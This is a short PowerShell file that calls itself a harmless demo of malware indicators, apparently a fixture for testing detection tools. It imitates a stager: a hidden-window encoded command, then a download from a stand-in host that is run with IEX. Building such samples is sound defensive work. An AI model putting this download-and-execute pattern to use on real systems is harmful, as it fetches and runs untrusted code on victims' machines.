# Benign demo sample - contains indicator strings only, no real payload.
$ErrorActionPreference = "SilentlyContinue"

# Looks like a stager: download + encoded command + hidden window.
powershell.exe -WindowStyle Hidden -EncodedCommand QUJDREVG
$client = New-Object Net.WebClient
$data = $client.DownloadString("http://example.invalid/stage")
IEX ( $data )

Write-Host "this is a harmless demonstration file"
